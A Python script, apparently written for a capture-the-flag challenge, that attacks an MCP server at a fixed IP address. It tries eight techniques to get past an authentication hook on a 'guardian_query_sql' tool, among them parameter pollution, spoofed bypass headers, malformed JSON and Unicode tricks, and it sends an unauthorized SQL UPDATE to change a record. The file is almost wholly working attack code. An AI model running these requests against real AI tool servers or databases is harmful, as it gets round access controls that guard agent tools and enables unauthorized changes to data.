#!/usr/bin/env python3
"""
MCP Hook Bypass Testing
Test various MCP protocol-level bypasses for the guardian_query_sql tool
"""

import requests
import json
import time

MCP_URL = "http://154.57.164.77:30826/mcp"
AUTH_TOKEN = "靑"

def test_mcp_bypass_techniques():
    """Test various MCP authentication bypass techniques"""

    techniques = []

    # Technique 1: Parameter pollution
    print("=== Technique 1: Parameter Pollution ===")
    try:
        payload = {
            "jsonrpc": "2.0",
            "method": "tools/call",
            "params": {
                "name": "guardian_query_sql",
                "name": "list_scrolls",  # Duplicate parameter
                "arguments": {"query": "UPDATE scrolls SET scroll_availability = 'Available' WHERE id = 7"}
            },
            "id": 1
        }
        response = requests.post(
            MCP_URL,
            json=payload,
            headers={"Authorization": f"Bearer {AUTH_TOKEN}"}
        )
        result = response.json()
        print(f"Result: {json.dumps(result)[:200]}")
        techniques.append(("Parameter Pollution", result))
    except Exception as e:
        print(f"Error: {e}")

    # Technique 2: Method confusion
    print("\n=== Technique 2: Method Confusion ===")
    try:
        payload = {
            "jsonrpc": "2.0",
            "method": "tools/call",
            "params": {
                "name": "list_scrolls",
                "arguments": {
                    "query": "UPDATE scrolls SET scroll_availability = 'Available' WHERE id = 7",
                    "name": "guardian_query_sql"  # Confused parameter
                }
            },
            "id": 2
        }
        response = requests.post(
            MCP_URL,
            json=payload,
            headers={"Authorization": f"Bearer {AUTH_TOKEN}"}
        )
        result = response.json()
        print(f"Result: {json.dumps(result)[:200]}")
        techniques.append(("Method Confusion", result))
    except Exception as e:
        print(f"Error: {e}")

    # Technique 3: Batch request with mixed tools
    print("\n=== Technique 3: Batch with Mixed Tools ===")
    try:
        payload = [
            {"jsonrpc": "2.0", "method": "tools/list", "params": {}, "id": 3},
            {"jsonrpc": "2.0", "method": "tools/call", "params": {"name": "guardian_query_sql", "arguments": {"query": "SELECT * FROM scrolls"}}, "id": 4}
        ]
        response = requests.post(
            MCP_URL,
            json=payload,
            headers={"Authorization": f"Bearer {AUTH_TOKEN}"}
        )
        result = response.json()
        print(f"Result: {json.dumps(result)[:200]}")
        techniques.append(("Batch Request", result))
    except Exception as e:
        print(f"Error: {e}")

    # Technique 4: Timing attack - rapid requests
    print("\n=== Technique 4: Timing Attack (Rapid Requests) ===")
    try:
        for i in range(5):
            payload = {
                "jsonrpc": "2.0",
                "method": "tools/call",
                "params": {"name": "guardian_query_sql", "arguments": {"query": "SELECT * FROM scrolls"}},
                "id": 5 + i
            }
            response = requests.post(
                MCP_URL,
                json=payload,
                headers={"Authorization": f"Bearer {AUTH_TOKEN}"}
            )
            if i == 0:
                result = response.json()
                print(f"First result: {json.dumps(result)[:200]}")
        techniques.append(("Timing Attack", result))
    except Exception as e:
        print(f"Error: {e}")

    # Technique 5: Header injection
    print("\n=== Technique 5: Header Injection ===")
    try:
        payload = {
            "jsonrpc": "2.0",
            "method": "tools/call",
            "params": {"name": "guardian_query_sql", "arguments": {"query": "SELECT * FROM scrolls"}},
            "id": 10
        }
        response = requests.post(
            MCP_URL,
            json=payload,
            headers={
                "Authorization": f"Bearer {AUTH_TOKEN}",
                "X-Guardian-Override": "1",  # Custom header
                "X-Bypass-Auth": "true"
            }
        )
        result = response.json()
        print(f"Result: {json.dumps(result)[:200]}")
        techniques.append(("Header Injection", result))
    except Exception as e:
        print(f"Error: {e}")

    # Technique 6: Broken JSON (parser differential)
    print("\n=== Technique 6: Broken JSON ===")
    try:
        # Malformed but recoverable JSON
        broken_json = '{"jsonrpc": "2.0", "method": "tools/call", '
        broken_json += '"params": {"name": "guardian_query_sql", '
        broken_json += '"arguments": {"query": "SELECT * FROM scrolls"}}, '
        broken_json += '"id": 11,}'  # Trailing comma

        response = requests.post(
            MCP_URL,
            data=broken_json,
            headers={
                "Authorization": f"Bearer {AUTH_TOKEN}",
                "Content-Type": "application/json"
            }
        )
        result = response.json()
        print(f"Result: {json.dumps(result)[:200]}")
        techniques.append(("Broken JSON", result))
    except Exception as e:
        print(f"Error: {e}")

    # Technique 7: Unicode normalization
    print("\n=== Technique 7: Unicode Normalization ===")
    try:
        # Use different Unicode representations
        guardian_unicode = "g\u0075ardian_query_sql"  # g with escape
        payload = {
            "jsonrpc": "2.0",
            "method": "tools/call",
            "params": {"name": guardian_unicode, "arguments": {"query": "SELECT * FROM scrolls"}},
            "id": 12
        }
        response = requests.post(
            MCP_URL,
            json=payload,
            headers={"Authorization": f"Bearer {AUTH_TOKEN}"}
        )
        result = response.json()
        print(f"Result: {json.dumps(result)[:200]}")
        techniques.append(("Unicode Normalization", result))
    except Exception as e:
        print(f"Error: {e}")

    # Technique 8: Case variation
    print("\n=== Technique 8: Case Variation ===")
    try:
        payload = {
            "jsonrpc": "2.0",
            "method": "TOOLS/call",  # Uppercase
            "params": {"name": "guardian_query_sql", "arguments": {"query": "SELECT * FROM scrolls"}},
            "id": 13
        }
        response = requests.post(
            MCP_URL,
            json=payload,
            headers={"Authorization": f"Bearer {AUTH_TOKEN}"}
        )
        result = response.json()
        print(f"Result: {json.dumps(result)[:200]}")
        techniques.append(("Case Variation", result))
    except Exception as e:
        print(f"Error: {e}")

    # Analysis
    print("\n" + "="*60)
    print("=== ANALYSIS ===")
    print("="*60)

    success_count = 0
    for name, result in techniques:
        if "error" not in str(result).lower() and "authentication" not in str(result).lower():
            print(f"✓ {name}: No auth error - possible bypass!")
            success_count += 1
        else:
            print(f"✗ {name}: Still requires authentication")

    print(f"\nSuccess rate: {success_count}/{len(techniques)} techniques")

    # Print full successful responses
    print("\n" + "="*60)
    print("=== DETAILED SUCCESSFUL RESPONSES ===")
    for name, result in techniques:
        if "error" not in str(result).lower() and "authentication" not in str(result).lower():
            print(f"\n{name}:\n{json.dumps(result, indent=2)}")

    return techniques

if __name__ == "__main__":
    print("Testing MCP Hook Bypass Techniques")
    print(f"Target: {MCP_URL}")
    print("="*60)

    techniques = test_mcp_bypass_techniques()

    print("\n" + "="*60)
    print("Test complete. Check output above for potential bypasses.")
